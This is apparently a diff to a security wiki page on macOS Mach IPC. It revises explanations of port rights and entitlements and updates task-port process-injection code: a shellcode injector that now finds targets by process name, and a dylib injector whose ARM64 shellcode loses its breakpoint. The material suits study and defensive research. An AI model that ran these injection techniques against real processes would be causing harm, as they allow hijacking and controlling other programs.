@@ -23,6 +23,7 @@ Port rights, which define what operations a task can perform, are key to this co
 * **Receive right**, which allows receiving messages sent to the port. Mach ports are MPSC (multiple-producer, single-consumer) queues, which means that there may only ever be **one receive right for each port** in the whole system (unlike with pipes, where multiple processes can all hold file descriptors to the read end of one pipe).
   * A **task with the Receive** right can receive messages and **create Send rights**, allowing it to send messages. Originally only the **own task has Receive right over its por**t.
 * **Send right**, which allows sending messages to the port.
+  * The Send right can be **cloned** so a task owning a Send right can clone the right and **grant it to a third task**.
 * **Send-once right**, which allows sending one message to the port and then disappears.
 * **Port set right**, which denotes a _port set_ rather than a single port. Dequeuing a message from a port set dequeues a message from one of the ports it contains. Port sets can be used to listen on several ports simultaneously, a lot like `select`/`poll`/`epoll`/`kqueue` in Unix.
 * **Dead name**, which is not an actual port right, but merely a placeholder. When a port is destroyed, all existing port rights to the port turn into dead names.
@@ -51,6 +52,27 @@ For these predefined services, the **lookup process differs slightly**. When a s
 * launchd duplicates the **SEND right and sends it to Task B**.
 
 However, this process only applies to predefined system tasks. Non-system tasks still operate as described originally, which could potentially allow for impersonation.
+
+### Mach Services
+
+The names specified in the applications located in the previous mentioned SIP protected directories cannot be registered by other processes.
+
+For example, `/System/Library/LaunchAgents/com.apple.xpc.loginitemregisterd.plist` registers the name `com.apple.xpc.loginitemregisterd`:
+
+```json
+plutil -p com.apple.xpc.loginitemregisterd.plist
+{
+  "EnablePressuredExit" => 1
+  "Label" => "com.apple.xpc.loginitemregisterd"
+  "MachServices" => {
+    "com.apple.xpc.loginitemregisterd" => 1
+  }
+  "ProcessType" => "Adaptive"
+  "Program" => "/usr/libexec/loginitemregisterd"
+}
+```
+
+If you try to register it with a code such as the following, you won't be able to.
 
 ### Code example
 
@@ -184,7 +206,7 @@ int main() {
 
 * **Host port**: If a process has **Send** privilege over this port he can get **information** about the **system** (e.g. `host_processor_info`).
 * **Host priv port**: A process with **Send** right over this port can perform **privileged actions** like loading a kernel extension. The **process need to be root** to get this permission.
-  * Moreover, in order to call **`kext_request`** API it's needed to have the entitlement **`com.apple.private.kext`** which is only given to Apple binaries.
+  * Moreover, in order to call **`kext_request`** API it's needed to have other entitlements **`com.apple.private.kext*`** which are only given to Apple binaries.
 * **Task name port:** An unprivileged version of the _task port_. It references the task, but does not allow controlling it. The only thing that seems to be available through it is `task_info()`.
 * **Task port** (aka kernel port)**:** With Send permission over this port it's possible to control the task (read/write memory, create threads...).
   * Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) while doing a `fork()`.
@@ -193,7 +215,7 @@ int main() {
     * Apps the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
     * **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).
 
-### Shellcode Process Injection via Task port&#x20;
+### Shellcode Injection in thread via Task port&#x20;
 
 You can grab a shellcode from:
 
@@ -206,12 +228,28 @@ You can grab a shellcode from:
 ```objectivec
 // clang -framework Foundation mysleep.m -o mysleep
 // codesign --entitlements entitlements.plist -s - mysleep
+
 #import <Foundation/Foundation.h>
+
+double performMathOperations() {
+    double result = 0;
+    for (int i = 0; i < 10000; i++) {
+        result += sqrt(i) * tan(i) - cos(i);
+    }
+    return result;
+}
 
 int main(int argc, const char * argv[]) {
     @autoreleasepool {
-        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
-        [NSThread sleepForTimeInterval:99999];
+        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
+processIdentifier]);
+        while (true) {
+            [NSThread sleepForTimeInterval:5];
+
+            performMathOperations();  // Silent action
+
+            [NSThread sleepForTimeInterval:5];
+        }
     }
     return 0;
 }
@@ -235,7 +273,7 @@ int main(int argc, const char * argv[]) {
 
 <details>
 
-<summary>injector.m</summary>
+<summary>sc_injector.m</summary>
 
 ```objectivec
 // gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
@@ -379,14 +417,54 @@ int inject(pid_t pid){
     return (0);
 }
 
+pid_t pidForProcessName(NSString *processName) {
+    NSArray *arguments = @[@"pgrep", processName];
+    NSTask *task = [[NSTask alloc] init];
+    [task setLaunchPath:@"/usr/bin/env"];
+    [task setArguments:arguments];
+
+    NSPipe *pipe = [NSPipe pipe];
+    [task setStandardOutput:pipe];
+
+    NSFileHandle *file = [pipe fileHandleForReading];
+
+    [task launch];
+
+    NSData *data = [file readDataToEndOfFile];
+    NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+
+    return (pid_t)[string integerValue];
+}
+
+BOOL isStringNumeric(NSString *str) {
+    NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+    NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
+    return r.location == NSNotFound;
+}
+
 int main(int argc, const char * argv[]) {
     @autoreleasepool {
         if (argc < 2) {
-            NSLog(@"Usage: %s <pid>", argv[0]);
+            NSLog(@"Usage: %s <pid or process name>", argv[0]);
             return 1;
         }
 
-        pid_t pid = atoi(argv[1]);
+        NSString *arg = [NSString stringWithUTF8String:argv[1]];
+        pid_t pid;
+
+        if (isStringNumeric(arg)) {
+            pid = [arg intValue];
+        } else {
+            pid = pidForProcessName(arg);
+            if (pid == 0) {
+                NSLog(@"Error: Process named '%@' not found.", arg);
+                return 1;
+            }
+            else{
+                printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
+            }
+        }
+
         inject(pid);
     }
 
@@ -398,16 +476,16 @@ int main(int argc, const char * argv[]) {
 
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
-./inject <pid-of-mysleep>
+./inject <pi or string>
 ```
 
-### Dylib Process Injection via Task port
+### Dylib Injection in thread via Task port
 
 In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previos injection, was generated using Mach api, so **it's not posix compliant**.
 
 It was possible to **inject a simple shellcode** to execute a command because it **didn't need to work with posix** compliant apis, only with Mach. **More complex injections** would need the **thread** to be also **posix compliant**.
 
-Therefore, to **improve the shellcode** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load our dylib** from the system.
+Therefore, to **improve the thread** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load a dylib** from the system, so instead of writing new shellcode to perform different actions it's possible to load custom libraries.
 
 You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):
 
@@ -470,7 +548,7 @@ kern_return_t mach_vm_write
 
 char injectedCode[] =
 
-    "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+    // "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
 
     // Call pthread_set_self
 
@@ -690,6 +768,8 @@ int main(int argc, const char * argv[])
 }
 ```
 
+
+
 </details>
 
 ```bash
@@ -697,7 +777,9 @@ gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
 
-### Thread Injection via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+
+In this technique a thread of the process is hijacked:
 
 {% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
 [macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
